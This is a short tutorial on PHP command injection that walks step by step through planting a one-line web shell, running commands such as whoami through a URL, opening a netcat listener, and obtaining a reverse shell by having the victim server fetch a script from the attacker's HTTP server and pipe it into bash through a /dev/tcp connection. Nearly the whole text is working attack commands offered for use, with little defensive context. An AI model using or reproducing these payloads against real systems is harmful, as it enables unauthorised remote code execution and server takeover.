# PHP injection code

Executing a command php from server side uploaded command.

There are a little tutorial showing how to create a simple injection and setting a RCE (**remote command execute**) from url connecting a netcat port from our side.


## Create the php file with that commands

    echo '<?php system($_GET["cmd"]); ?>' > shell.php

## Executing some commands from url to php file.

    http://{IP}:{PORT}/shell.php?cmd=whoami

After be sure to execute a whoami command and return somethig like this:

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

Open a netcat port

    nc -lvnp 9091

### Create the **shell.php** with bash connection

```
bash -i >& /dev/tcp/<IP_ADDRESS>/9091 0>&1
```

Into your computer open port 8000 as web server

    python3 -m http.server 8000

then into the victim url set the injection code to getting our bash shell

    http://<IP>:PORT/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash

Once you press enter on the url would be trigger a shell in our netcat command as a Remote Shell

